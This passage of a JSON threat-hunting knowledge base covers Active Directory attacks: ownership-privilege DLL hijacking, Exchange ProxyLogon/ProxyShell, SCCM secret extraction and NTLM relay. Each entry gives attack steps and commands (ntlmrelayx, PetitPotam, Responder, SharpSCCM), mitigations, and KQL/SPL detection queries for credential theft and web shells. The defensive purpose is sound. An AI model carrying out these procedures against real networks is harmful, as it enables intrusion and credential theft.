Objects=make_set(ObjectName, 20), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated)\n    by SubjectUserName, Computer\n| where Changes >= 1\n| order by Changes desc"}],"huntcs":[{"plat":"Event Search","t":"gMSA read / membership-write tooling on attacker host","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*msDS-ManagedPassword*\" OR CommandLine=\"*PrincipalsAllowedToRetrieveManagedPassword*\" OR CommandLine=\"*ConvertFrom-ADManagedPasswordBlob*\" OR CommandLine=\"*GMSAPasswordReader*\" OR CommandLine=\"*gMSADumper*\" OR CommandLine=\"*Set-ADServiceAccount*\")\n| stats count as n, values(CommandLine) as cmds, values(FileName) as procs by aid, ComputerName, UserName\n| where n>0"},{"plat":"Identity Protection","t":"DC-side LDAP read / attribute change is out of EDR scope; use Falcon Identity Protection","q":"// Reading msDS-ManagedPassword over LDAP and modifying msDS-GroupMSAMembership occur on the DC and are NOT in Falcon endpoint sensor telemetry.\n// Use Falcon Identity Protection: alert on gMSA password-read / LDAP reconnaissance and account-privilege-change detections,\n// and flag the gMSA account authenticating (Kerberos TGT) from a host that is not one of its designated member servers."}]},{"name":"SeManageVolume / SeTakeOwnership Abuse","aka":"SeManageVolumePrivilege, SeTakeOwnershipPrivilege, DLL planting","phase":"privesc","group":"ホスト/ローカル","mitre":"T1222.001, T1574.001","cve":"","sev":"High","summary":"Abuse of a low-privileged token holding SeManageVolumePrivilege or SeTakeOwnershipPrivilege to seize the DACL/ownership of files under C:\\Windows\\System32, plant or replace a DLL, and have a SYSTEM service load it — yielding local privilege escalation to SYSTEM.","how":"Prerequisites: attacker token holds SeManageVolumePrivilege or SeTakeOwnershipPrivilege (disabled by default, enabled via AdjustTokenPrivileges), typically from a misconfigured User Rights Assignment group or a service account. First confirm with whoami /priv.\n[SeManageVolume path] Running CsEnox's SeManageVolumeExploit.exe uses the privilege to recursively grant Authenticated Users full control on C:\\Windows (including System32), making System32 writable by a non-admin. The attacker then drops a malicious DLL (built with msfvenom, etc.) as a phantom/hijack DLL that a SYSTEM service resolves — e.g. wlbsctrl.dll (IKEEXT), TSMSISrv.dll, wbemcomn.dll, WptsExtensions.dll (Task Scheduler) — and it loads as SYSTEM on service/host restart.\n[SeTakeOwnership path] The privilege lets the token take ownership of any object bypassing its DACL. Use takeown /f or PowerShell Set-Owner to become owner of a target DLL/EXE (e.g. a System32 DLL, utilman.exe); as owner you hold WRITE_DAC, so icacls /grant gives yourself full control, you replace the binary with a malicious one and let a privileged process execute it. Key primitive: privilege-driven unilateral rewrite of ownership/DACL → arbitrary write into a protected location → DLL/binary hijack.","tools":"SeManageVolumeExploit (CsEnox), whoami /priv, takeown.exe, icacls.exe, PowerShell Set-Owner/Set-Acl, msfvenom (malicious DLL), custom DLL, accesschk.exe (privilege/ACL checks), Sysmon","detect":"Key signals: (1) A process other than TrustedInstaller/TiWorker/msiexec writing/creating a .dll under System32 or System32\\wbem (DeviceFileEvents / Sysmon 11 / 4663). (2) takeown.exe or icacls.exe running /setowner or /grant against System32 or system binaries like sethc/utilman (4688 / DeviceProcessEvents / ProcessRollup2). (3) Privilege use: taking ownership via SeTakeOwnershipPrivilege fires 4674 (operation on a privileged object); DACL/owner change fires 4670; privilege enablement fires 4703; SeTakeOwnership is one of the 4672 sensitive privileges. (4) A known phantom DLL name (e.g. wlbsctrl.dll) loaded into a SYSTEM process with an unexpected SHA256 (Sysmon 7 / DeviceImageLoadEvents). Telemetry: MDE Device* tables, Sysmon (1/7/11), Windows security auditing (Object Access / Sensitive Privilege Use / Authorization Policy Change), and file integrity monitoring.","events":"4688(takeown/icacls実行), 4703(特権の調整), 4674(特権オブジェクト操作:SeTakeOwnership), 4670(所有者/アクセス許可の変更), 4663(System32ファイル書込), 4672(SeTakeOwnership特権割当:新規ログオン), Sysmon 11(DLL作成), Sysmon 7(不正DLLロード)","mitigate":"(1) Do not grant SeManageVolumePrivilege or SeTakeOwnershipPrivilege to non-admins — restrict \"Perform volume maintenance tasks\" and \"Take ownership of files or other objects\" to Administrators only, and audit URA/GPO across AD. (2) Do not assign these privileges to service accounts that don't need them. (3) Eliminate System32 phantom DLLs — disable unneeded services and monitor for known missing DLLs (e.g. wlbsctrl.dll). (4) Enforce WDAC/AppLocker to allow only signed DLLs and to detect/block non-TrustedInstaller writes to System32. (5) Enable Sensitive Privilege Use and Object Access auditing and collect 4674/4670/4703. (6) Use LSA protection / attack surface reduction and periodically inspect privilege drift with whoami /priv and accesschk.","triage":"Black (malicious): On the target host in MDE/Sysmon, a chain within a short window from a non-elevated/low-priv user's process (e.g. SeManageVolumeExploit.exe): 4703 (enabling SeManageVolume/SeTakeOwnership) → 4688 for takeown/icacls plus 4670 (owner/DACL change on a System32 DLL) → Sysmon 11 (DLL created under System32 by a writer other than TiWorker) → shortly after a service restart, Sysmon 7 (that DLL loaded into services.exe / a SYSTEM service, unsigned or unknown SHA256). For the SeTakeOwnership path, 4674 (PrivilegeList=SeTakeOwnershipPrivilege) plus 4670 fire against sethc/utilman/System32 DLLs on the same host.\nWhite (benign): The same 4670/4663/Sysmon 11 is benign when the writer is TiWorker.exe/TrustedInstaller/msiexec/poqexec (Windows Update or MSI deployment), the SHA256 is Microsoft-signed, and the change falls in a maintenance window. An admin deliberately running takeown/icacls from a known management host with a change ticket (Administrators token, 4672 tied to an admin logon) is benign, as is a backup-operations account using SeTakeOwnership on files it backs up with no DLL replacement or subsequent SYSTEM load. Adjudicate by correlating writer-process legitimacy × whether the target is a protected System32 DLL × presence of an immediate follow-on DLL load.","hunt":[{"plat":"MDE","t":"Non-TrustedInstaller DLL write into System32","q":"DeviceFileEvents\n| where Timestamp > ago(14d)\n| where FolderPath has_any (@\"\\Windows\\System32\", @\"\\Windows\\System32\\wbem\")\n| where FileName endswith \".dll\"\n| where ActionType in (\"FileCreated\",\"FileModified\")\n| where InitiatingProcessFileName !in~ (\"TiWorker.exe\",\"TrustedInstaller.exe\",\"msiexec.exe\",\"poqexec.exe\",\"drvinst.exe\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"takeown/icacls owner/ACL ops on system binaries","q":"DeviceProcessEvents\n| where Timestamp > ago(14d)\n| where FileName in~ (\"takeown.exe\",\"icacls.exe\")\n| where ProcessCommandLine has_any (\"System32\",\"/setowner\",\"/grant\",\"sethc\",\"utilman\",\".dll\")\n| where ProcessCommandLine has_any (@\"\\Windows\\\", \".dll\", \".exe\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName\n| order by Timestamp desc"},{"plat":"Sentinel","t":"Use/adjust of SeTakeOwnership/SeManageVolume privileges","q":"SecurityEvent\n| where TimeGenerated > ago(14d)\n| where EventID in (4674,4703)\n| where PrivilegeList has_any (\"SeTakeOwnershipPrivilege\",\"SeManageVolumePrivilege\")\n| where Account !endswith \"$\"\n| summarize Events=count(), Objects=make_set(ObjectName,20) by Computer, Account, EventID, PrivilegeList, bin(TimeGenerated,1h)\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"takeown/icacls against System32/system binaries","q":"event_simpleName=ProcessRollup2 (FileName=takeown.exe OR FileName=icacls.exe) (CommandLine=*System32* OR CommandLine=*/setowner* OR CommandLine=*/grant* OR CommandLine=*utilman* OR CommandLine=*sethc*)\n| stats count(aid) as cnt values(CommandLine) as cmds values(UserName) as users by ComputerName, FileName, ParentBaseFileName\n| sort - cnt"},{"plat":"LogScale","t":"Privilege-op tooling from low-integrity process","q":"#event_simpleName=ProcessRollup2\n| in(field=FileName, values=[takeown.exe, icacls.exe])\n| CommandLine=/System32|setowner|\\.dll|utilman|sethc/i\n| groupBy([ComputerName, UserName, FileName, IntegrityLevel], function=collect([CommandLine, ParentBaseFileName]))"}]},{"name":"Exchange Server RCE Chain (ProxyLogon / ProxyShell / ProxyNotShell)","aka":"ProxyLogon, ProxyShell, ProxyNotShell, OWA SSRF, web shell","phase":"privesc","group":"重大CVE","mitre":"T1190, T1505.003","cve":"CVE-2021-26855, CVE-2021-34473, CVE-2022-41040","sev":"Critical","summary":"A chain of Microsoft Exchange (on-prem) vulnerabilities (ProxyLogon/ProxyShell/ProxyNotShell) combining an OWA/Autodiscover/ECP SSRF with arbitrary file write or a backend PowerShell RCE, letting an unauthenticated or low-privileged attacker plant an ASPX web shell and execute code as the Exchange machine/SYSTEM — one of the most widely exploited RCE chains in AD environments.","how":"Prereqs: an unpatched internet/internal-reachable Exchange 2013/2016/2019. ProxyLogon (CVE-2021-26855) is pre-auth; ProxyShell (CVE-2021-34473) is pre-auth via an Autodiscover path-confusion SSRF; ProxyNotShell (CVE-2022-41040) needs any valid mailbox credentials. Steps: (1) use SSRF to pivot the front-end into backend EWS/PowerShell/DDI endpoints (ProxyLogon = POST /ecp/DDIService.svc with an X-BEResource cookie; ProxyShell = /autodiscover/autodiscover.json?@evil/powershell with a forged X-Rps-CAT token). (2) abuse CVE-2021-27065 (rewriting the ECP/OAB virtual-directory config) or New-MailboxExportRequest to write a PST/ASPX into a web-exposed directory. (3) drop a small web shell (China Chopper) under owa\\auth, aspnet_client, or FrontEnd\\HttpProxy\\ecp\\auth. (4) run commands via the web shell: w3wp.exe spawns cmd.exe/powershell.exe, dump LSASS with procdump/comsvcs.dll, extract NTDS.dit with ntdsutil, escalate with GodPotato/PrintSpoofer, pivot to the DC. Key primitive: SSRF-driven backend impersonated auth (HTTP machine/SYSTEM context) plus arbitrary file write.","tools":"proxylogon.py / proxyshell.py PoCs, Metasploit (exchange_proxyshell_rce / proxynotshell), China Chopper, ASPXSpy, ReGeorg, Nishang, procdump / comsvcs.dll MiniDump, ntdsutil, GodPotato / PrintSpoofer, PowerCat, Test-ProxyLogon.ps1","detect":"Key signals: (1) IIS W3SVC logs (C:\\inetpub\\logs\\LogFiles\\W3SVC1) showing the ProxyLogon-specific POST /ecp/DDIService.svc with an X-BEResource cookie, or ProxyShell-specific /autodiscover/autodiscover.json?...@.../powershell and abnormal /mapi/nspi URLs returning 200. (2) new .aspx/.ashx files under Exchange web dirs (owa\\auth, aspnet_client, ecp\\auth, FrontEnd\\HttpProxy) via Sysmon EID11 / DeviceFileEvents. (3) w3wp.exe / UMWorkerProcess.exe spawning cmd.exe / powershell.exe / net.exe / csc.exe (4688 / Sysmon EID1). (4) MSExchange Management operational log showing New-MailboxExportRequest / Set-OabVirtualDirectory run by a non-admin. (5) PowerShell script-block (4104) with encoded payloads. Microsoft's Test-ProxyLogon.ps1 and HttpProxy log parsing are effective.","events":"4688(w3wp/UMWorkerProcess→cmd/powershell), Sysmon 1(プロセス生成), Sysmon 11(Webシェル.aspx作成), 4104(PSスクリプトブロック), MSExchange Management(New-MailboxExportRequest / Set-OabVirtualDirectory), IIS W3SVC log(POST /ecp/DDIService.svc, /autodiscover.json?@)","mitigate":"(1) Apply the relevant security updates immediately: ProxyLogon = March 2021 SU, ProxyShell = May/July 2021 CU/SU, ProxyNotShell = November 2022 SU (older CUs must be updated first). (2) Until patched, apply Microsoft's EOMT.ps1 and the URL Rewrite mitigation blocking requests matching `.*autodiscover\\.json.*Powershell.*`. (3) Disable remote PowerShell for non-admins (Set-User -RemotePowerShellEnabled $false). (4) Enable Extended Protection to defeat token relay/impersonation. (5) Stop external exposure of OWA/ECP/PowerShell virtual directories; front them with VPN/reverse proxy. (6) Run MSERT/Safety Scanner to remove known web shells, monitor web-dir integrity, and minimize write permissions. (7) Migrate end-of-life Exchange (e.g. 2013) to Exchange Online or a supported version.","triage":"Black (malicious): on the Exchange host, w3wp.exe running under MSExchangeECPAppPool/MSExchangeOWAAppPool (or UMWorkerProcess.exe) spawns cmd.exe/powershell.exe (4688/Sysmon1), and within seconds the same w3wp.exe writes a new .aspx under owa\\auth or aspnet_client (Sysmon11) — that same-host, few-second correlation confirms web-shell execution. If IIS W3SVC logs also show a 200 on POST /ecp/DDIService.svc with an X-BEResource cookie (ProxyLogon) or /autodiscover/autodiscover.json?...@.../powershell (ProxyShell), and MSExchange Management logs concurrently record a non-admin running New-MailboxExportRequest/Set-OabVirtualDirectory, the full chain is established. White (benign): a legitimate admin running a mailbox export via the ECP UI or EMS from an admin workstation (change ticket, admin account, business hours); transient processes from OABGenerator or setup during CU/SU installs; normal OWA/ECP usage (GET-dominant, no new .aspx, valid user auth in W3SVC). Discriminator: w3wp spawning child processes is inherently rare in steady state; separate black from white by correlating parent app-pool name + .aspx write into a web directory + the anomalous IIS URL.","hunt":[{"plat":"MDE","t":"Exchange IIS worker spawning child process (web-shell execution)","q":"DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"w3wp.exe\",\"UMWorkerProcess.exe\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"net.exe\",\"net1.exe\",\"csc.exe\",\"whoami.exe\",\"nltest.exe\",\"cscript.exe\")\n| where InitiatingProcessCommandLine has_any (\"MSExchangeECPAppPool\",\"MSExchangeOWAAppPool\",\"MSExchangeAutodiscoverAppPool\",\"MSExchange\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, AccountName\n| sort by Timestamp desc"},{"plat":"MDE","t":"ASPX/ASHX web-shell written into Exchange web-exposed directory","q":"DeviceFileEvents\n| where ActionType in (\"FileCreated\",\"FileModified\")\n| where InitiatingProcessFileName in~ (\"w3wp.exe\",\"UMWorkerProcess.exe\")\n| where FileName endswith \".aspx\" or FileName endswith \".ashx\" or FileName endswith \".asmx\"\n| where FolderPath has_any (@\"FrontEnd\\HttpProxy\\owa\\auth\", @\"FrontEnd\\HttpProxy\\ecp\\auth\", \"aspnet_client\", @\"ClientAccess\\Owa\\auth\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"w3wp/UMWorkerProcess spawning a shell (SPL)","q":"event_simpleName=ProcessRollup2 (ParentBaseFileName=w3wp.exe OR ParentBaseFileName=UMWorkerProcess.exe) (FileName=cmd.exe OR FileName=powershell.exe OR FileName=net.exe OR FileName=csc.exe OR FileName=whoami.exe OR FileName=nltest.exe OR FileName=cscript.exe)\n| stats count min(_time) as firstSeen values(CommandLine) as cmds by aid, ComputerName, ParentBaseFileName, FileName\n| sort - count"},{"plat":"LogScale","t":"Shell execution under Exchange IIS worker (CQL)","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/^(w3wp|UMWorkerProcess)\\.exe$/i\n| FileName=/^(cmd|powershell|net|net1|csc|whoami|nltest|cscript)\\.exe$/i\n| groupBy([ComputerName, ParentBaseFileName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"}]},{"name":"SCCM Policy Secret Extraction (NAA / Task Sequence / Collection Variables)","aka":"SharpSCCM get secrets, Network Access Account, DPAPI, CIM, MOF","phase":"credaccess","group":"管理インフラ悪用 (SCCM/WSUS/MSSQL)","mitre":"T1555, T1552","cve":"","sev":"High","summary":"Extraction of secrets embedded in SCCM/MECM machine policy — Network Access Account (NAA), Task Sequence variables, and Collection Variables — either by decrypting DPAPI-protected blobs locally (as SYSTEM) or by registering a rogue device with the Management Point (MP) and requesting policy, yielding cleartext credentials that are frequently domain accounts.","how":"Prereqs: (A) Local extraction needs local admin → SYSTEM on an SCCM client. (B) Remote extraction needs HTTP(S) reachability to the MP; with default automatic client approval a domain computer account suffices, otherwise a rogue registration is required. Local method: SharpSCCM.exe local secrets reads WMI namespace root\\ccm\\policy\\Machine\\ActualConfig, class CCM_NetworkAccessAccount (NetworkAccessUsername/NetworkAccessPassword), and decrypts the PolicySecret (a DPAPI blob) using the SYSTEM DPAPI master key under C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18. TS and Collection variables live under the same ActualConfig store. Remote method: SharpSCCM.exe get secrets generates a self-signed cert, registers a NEW device with the MP, requests machine policy assignments, and downloads the NetworkAccessAccount policy body; because the NAA credential is encrypted to the requesting client's public key, the attacker decrypts it with the private key it just generated — no admin on any client needed. PXEThief is a variant that recovers NAA from PXE boot media variable files. The key primitive is DPAPI/certificate decryption of the PolicySecret. MITRE: harvesting credentials from a policy/password store (T1555) and abusing credentials left unsecured (T1552).","tools":"SharpSCCM (get secrets / local secrets), SCCMHunter, PXEThief, MalSCCM, sccmwtf/pysccm, CMLoot, Impacket/DonPAPI (DPAPI decryption), PowerShell + WMI/CIM (Get-WmiObject root\\ccm\\policy)","detect":"Local: WMI queries against root\\ccm\\policy\\Machine by a non-CcmExec process (SharpSCCM.exe, powershell, rundll32, dotnet), command lines containing CCM_NetworkAccessAccount, and file access to the SYSTEM DPAPI master key (S-1-5-18\\Protect). Telemetry: MDE DeviceProcessEvents/DeviceFileEvents, Sysmon (WMI/ImageLoad), Microsoft-Windows-WMI-Activity/Operational. Remote: new device registrations and policy requests from unexpected hostnames in the MP's mp_registrationmanager.log / MP_GetAuth / MP_Policy, a tight register→request-policy sequence, and /ccm_system/request POSTs from IPs that are not managed clients. Post-extraction: the NAA / domain service account authenticating (Type3/Kerberos) from a new host that is not a distribution point (lateral-movement signal).","events":"4688(SharpSCCM/PowerShell/WMIツール実行), 4624 Type3(抽出NAA資格情報の再利用), 4768/4769(NAAドメインアカウントのKerberos再利用), SCCMログ: mp_registrationmanager.log / MP_Policy / MP_GetAuth(不正デバイス登録・ポリシー要求)","mitigate":"Top priority: eliminate the Network Access Account by moving to Enhanced HTTP + PKI certificates + Microsoft Entra join, which removes the need for an NAA. If an NAA is still required, use a dedicated low-privilege account with no interactive logon, no local admin, only \"Access this computer from the network\" on distribution points, and rotate it regularly. Switch client approval from automatic to manual (or same-forest only) to block rogue device registration. Remove credentials from Task Sequence variables and mark sensitive variables; use gMSA for domain-join steps. Treat SCCM infrastructure (site server / MP / SMS Provider) as Tier-0, require a password on PXE responses, deploy LAPS, and add detections for SharpSCCM execution.","triage":"Malicious (black): on a client or attacker host, 4688 shows powershell/rundll32/dotnet or SharpSCCM.exe with CCM_NetworkAccessAccount in the command line and a parent that is NOT CcmExec. Immediately after, a non-CcmExec process POSTs to /ccm_system/request on the MP, and the MP's mp_registrationmanager.log shows a NEW device registration from an unexpected hostname with no matching legitimate OSD/imaging deployment. Post-extraction, the NAA/domain account fires 4624 Type3 / 4768-4769 from a new host that is not a distribution point = credential reuse. Chained within minutes on the same aid/host = black. Benign (white): CcmExec.exe (SYSTEM) reading CCM_NetworkAccessAccount as part of normal policy processing is expected, with parent ccmexec/svchost; device registration and policy retrieval originated by ccmexec during a genuine OSD/PXE image build is white (correlate with an active task-sequence deployment); the NAA account performing Type3 logons to distribution points for content access is white. Discriminators: is the initiating process CcmExec or not, is the host an existing managed client or a newly registered one, and does it correlate with an OSD deployment.","hunt":[{"plat":"MDE","t":"SharpSCCM / CCM policy-secret tooling executed by a non-CcmExec parent","q":"DeviceProcessEvents\n| where Timestamp > ago(30d)\n| where FileName =~ \"SharpSCCM.exe\"\n    or ProcessCommandLine has_any (\"get secrets\",\"local secrets\",\"CCM_NetworkAccessAccount\",\"NetworkAccessUsername\",\"NetworkAccessPassword\",\"root\\\\ccm\\\\policy\\\\Machine\",\"get naa\")\n| where InitiatingProcessFileName !in~ (\"CcmExec.exe\",\"ccmsetup.exe\")\n| project Timestamp, DeviceName, AccountName, AccountDomain, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Policy/registration request to the MP from a non-CcmExec process (rogue registration)","q":"DeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where RemoteUrl has_any (\"/ccm_system/request\",\"/ccm_system_windowsauth\",\"ccm_system\")\n    or (RemotePort in (80,443) and InitiatingProcessCommandLine has_any (\"secrets\",\"CCM_NetworkAccessAccount\",\"register\"))\n| where InitiatingProcessFileName !in~ (\"CcmExec.exe\",\"svchost.exe\",\"wininit.exe\",\"ccmsetup.exe\")\n| where InitiatingProcessFileName has_any (\"powershell\",\"pwsh\",\"SharpSCCM\",\"rundll32\",\"dotnet\",\"cmd\")\n| summarize Requests=count(), Urls=make_set(RemoteUrl,20) by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Requests desc"},{"plat":"MDI","t":"NAA/SCCM service account authenticating from many new hosts (extracted-credential reuse)","q":"IdentityLogonEvents\n| where Timestamp > ago(30d)\n| where Protocol in (\"Ntlm\",\"Kerberos\")\n| where AccountName has_any (\"naa\",\"sccm\",\"ccm\",\"_svc\",\"content\")\n| summarize Devices=make_set(DeviceName,50), DistinctDevices=dcount(DeviceName), IPs=make_set(IPAddress,50) by AccountName\n| where DistinctDevices > 3\n| order by DistinctDevices desc"}],"huntcs":[{"plat":"Event Search","t":"SharpSCCM / CCM_NetworkAccessAccount referencing process (excluding CcmExec parent)","q":"event_simpleName=ProcessRollup2 (FileName=SharpSCCM.exe OR CommandLine=\"*get secrets*\" OR CommandLine=\"*local secrets*\" OR CommandLine=\"*CCM_NetworkAccessAccount*\" OR CommandLine=\"*NetworkAccessUsername*\" OR CommandLine=\"*root\\\\ccm\\\\policy*\")\n| search NOT ParentBaseFileName IN (CcmExec.exe, ccmsetup.exe)\n| stats count as cnt values(CommandLine) as cmds values(ParentBaseFileName) as parents by aid, ComputerName, UserName, FileName"},{"plat":"Event Search","t":"Script/SharpSCCM 80/443 connection to MP (suspected policy request)","q":"event_simpleName=NetworkConnectIP4 (RemotePort=80 OR RemotePort=443) (ContextBaseFileName=SharpSCCM.exe OR ContextBaseFileName=powershell.exe OR ContextBaseFileName=pwsh.exe OR ContextBaseFileName=rundll32.exe OR ContextBaseFileName=dotnet.exe)\n| stats count as cnt dc(RemoteAddressIP4) as dsts values(RemoteAddressIP4) as ips by aid, ComputerName, ContextBaseFileName\n| sort - cnt"}]},{"name":"NTLM Relay to WinRM / HTTP","aka":"ntlmrelayx -t http(s)://, WinRM 5985/5986, AD FS, SharePoint","phase":"coercion","group":"ポイズニング/リレー/Coercion","mitre":"T1557.001, T1187","cve":"","sev":"High","summary":"An attacker coerces authentication (PetitPotam/PrinterBug) or poisons name resolution (Responder/mitm6) to capture NTLM, then relays it with ntlmrelayx to HTTP-based services that lack signing protection — WinRM (5985/5986), AD FS, SharePoint, AD CS web enrollment (ESC8) — to gain command execution or a certificate as the victim, turning a single machine-account NTLM into lateral movement or privilege escalation.","how":"Prereqs: attacker on the network able to (a) coerce authentication (as an authenticated user, or via unauthenticated EFSRPC/MS-RPRN paths) or (b) poison LLMNR/NBT-NS/mDNS/WPAD. The HTTP target must accept NTLM with EPA (Extended Protection for Authentication) not enforced. For actual WinRM command execution the relayed identity (typically a machine account or admin) must be a local admin on the target. Steps: (1) launch `ntlmrelayx.py -t http://winrm-target:5985/wsman -smb2support`, or `-t https://adfs/`, or for AD CS `-t http://ca/certsrv/certfnsh.asp --adcs --template Machine`. (2) In another window trigger NTLM from a victim toward the relay with `Coercer coerce` / `PetitPotam.py <relay-ip> <victim-DC>` / `printerbug.py`, or poison broadcasts with `Responder -I eth0`, or hijack DNS/WPAD in IPv6 with `mitm6 -d domain.local`. (3) The victim's Net-NTLM is relayed to the HTTP target — WinRM yields SOAP-based command execution, AD CS issues a certificate for the victim machine (then PKINIT → TGT/NTLM hash). Key primitive: HTTP has no default integrity protection like SMB signing / LDAP channel binding, so with EPA disabled the relay succeeds.","tools":"Impacket ntlmrelayx.py, Responder, PetitPotam, Coercer, printerbug.py/dementor.py (MS-RPRN/MS-EFSR), mitm6, krbrelayx, Certipy (ESC8), evil-winrm (validation)","detect":"Signals: (1) NTLM (package NTLM) network logon 4624 Type3 on the target where the source IP is the attacker's relay host, not the account owner's usual device — a machine account ($) doing an NTLM WinRM logon is especially anomalous (machines normally use Kerberos). (2) On the WinRM target, wsmprovhost.exe spawning cmd/powershell child processes (remote command execution). (3) DC 4776 (NTLM credential validation) for the same account at the same time, with the validating workstation being the relay host. (4) Coercion traces: passive Net-NTLM from target to relay, and lsarpc/efsrpc named-pipe access (5145) on the coerced DC/server. Telemetry: target Security/WinRM Operational logs, DC Security (4776), MDE (DeviceProcess/DeviceNetwork/DeviceLogon), MDI (IdentityLogonEvents NTLM).","events":"4624(Type3/NTLM・標的), 4776(NTLM検証/DC), 4672, 4688(wsmprovhost.exe→子プロセス), WinRM Operational(Microsoft-Windows-WinRM/Operational 91/168), 5145(lsarpc/efsrpc パイプ・強制認証時), AD CS発行時 4886/4887","mitigate":"(1) Enforce EPA (Extended Protection for Authentication) on HTTP targets: WinRM over HTTPS (5986) with channel binding, enable EPA on AD FS/SharePoint/AD CS web enrollment (CES/certsrv), and disable HTTP enrollment on AD CS (HTTPS+EPA only). (2) Disable/restrict NTLM where possible (GPO \"Network security: Restrict NTLM\") and enforce Kerberos. (3) Close coercion paths: mitigate PetitPotam (KB5005413, block NTLM/EFSRPC routes), disable Print Spooler on DCs and critical servers. (4) Disable LLMNR/NBT-NS/mDNS/WPAD to stop poisoning; block IPv6 if unused to defeat mitm6. (5) Restrict WinRM to a management subnet and minimize machine-account local-admin rights. (6) Enforce SMB signing and LDAP signing/channel binding org-wide to shrink the set of relayable targets.","triage":"Black (malicious): on the WinRM/HTTP target's Security log, a 4624 Type3 logon with authentication package NTLM whose source IP is the attacker's relay host (not the account owner's usual device), immediately followed on the same host by 4688 wsmprovhost.exe spawning cmd/powershell/reg = relayed remote execution. If the principal is a machine account ($) using NTLM (normally Kerberos), suspicion is high. At the same time the DC's 4776 validates that account with the validating workstation being the relay host, and the coerced DC/server shows a preceding 5145 (lsarpc/efsrpc pipe) = the coercion chain. For an AD CS target, 4886/4887 request/issuance correlate under the victim machine name. White (benign): WinRM from a known management host/automation (Ansible, WEC, PowerShell Remoting) using Kerberos (not NTLM), principal a legitimate admin/service user, source IP in the expected management subnet, and wsmprovhost children being known operational scripts. It is distinguishable because it is not a machine account and produces no DC 4776 (Kerberos).","hunt":[{"plat":"MDE","t":"wsmprovhost.exe spawning shells (relayed execution)","q":"DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"wsmprovhost.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"whoami.exe\",\"net.exe\",\"net1.exe\",\"reg.exe\",\"rundll32.exe\",\"cscript.exe\",\"wmic.exe\")\n| project Timestamp, DeviceName, AccountName, AccountDomain, FileName, ProcessCommandLine, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDI","t":"Machine-account NTLM logon (relay fingerprint)","q":"IdentityLogonEvents\n| where Protocol == \"Ntlm\" and ActionType == \"LogonSuccess\"\n| where AccountName endswith \"$\"\n| project Timestamp, AccountName, DeviceName, TargetDeviceName, IPAddress, Application, LogonType\n| order by Timestamp desc\n// machines normally auth via Kerberos; NTLM by a $-account to a WinRM/HTTP target is anomalous"},{"plat":"MDE","t":"Anomalous source of inbound WinRM connections","q":"DeviceNetworkEvents\n| where ActionType == \"InboundConnectionAccepted\"\n| where LocalPort in (5985, 5986)\n| summarize Conns=count(), Hours=dcount(bin(Timestamp,1h)) by DeviceName, RemoteIP\n| order by Conns desc\n// pivot RemoteIP against known management hosts; unexpected source = relay candidate"}],"huntcs":[{"plat":"Event Search","t":"wsmprovhost child processes (WinRM remote exec)","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=wsmprovhost.exe\n| search FileName IN (cmd.exe, powershell.exe, pwsh.exe, net.exe, net1.exe, reg.exe, whoami.exe, rundll32.exe, cscript.exe, wmic.exe)\n| stats count values(CommandLine) as cmds by aid, ComputerName, UserName, FileName"},{"plat":"Identity Protection","t":"NTLM relay / anomalous machine-account NTLM auth","q":"// Falcon Identity Protection detection: 'NTLM relay' / anomalous NTLM authentication where a computer account authenticates via NTLM to a WinRM/HTTP/AD CS target. EDR cannot see the DC-side NTLM validation; use Identity Protection policy on NTLM + coercion.\n// Endpoint pivot on the target host for relayed WinRM sessions:\n// event_simpleName=NetworkReceiveAcceptIP4 LocalPort IN (5985,5986) | stats count by aid, ComputerName, RemoteAddressIP4, ContextBaseFileName"}]},{"name":"NTLM Relay to MS-RPC (Task Scheduler / DCOM)","aka":"ntlmrelayx rpc://, ITaskSchedulerService, IObjectExporter, DCOM activation","phase":"coercion","group":"ポイズニング/リレー/Coercion","mitre":"T1557.001, T1187","cve":"","sev":"High","summary":"This technique coerces a machine account (via PetitPotam/PrinterBug/DFSCoerce, etc.) into NTLM-authenticating to an attacker relay, then relays that authentication with ntlmrelayx to an RPC endpoint (MS-TSCH ITaskSchedulerService or an MS-DCOM activation interface) to register a SYSTEM scheduled task = remote code execution. Because RPC over TCP does not enforce signing/EPA by default, it sidesteps SMB-signing defenses, achieving lateral movement and privilege escalation.","how":"Prerequisites: network position (same L2 / routable to victim and target) plus a coercible account (typically a machine account, e.g. A$ that is a local admin on target B — SCCM, clustering, delegated admin setups). Procedure: (1) Coerce authentication — PetitPotam.py (MS-EFSRPC EfsRpcOpenFileRaw), printerbug.py/SpoolSample (MS-RPRN RpcRemoteFindFirstPrinterChangeNotification), dfscoerce.py (MS-DFSNM), or Coercer, forcing a target (often a DC/server) to NTLM-authenticate to the attacker host. (2) Relay — impacket ntlmrelayx.py: `ntlmrelayx.py -t rpc://<target> -smb2support`; specifying an rpc:// target invokes rpcattack.py, which calls ITaskSchedulerService::SchRpcRegisterTask over ncacn_ip_tcp (135 → dynamic ports) to register a task (command set via `-c`); a DCOM path relays activation to IObjectExporter/ISystemActivator. Key primitive: RPC over TCP does not enforce signing/EPA by default, so this bypasses SMB-signing requirements, and the relayed machine account's local-admin rights let the scheduled task run as SYSTEM = immediate RCE.","tools":"impacket ntlmrelayx.py (rpcattack, rpc:// target), PetitPotam.py, 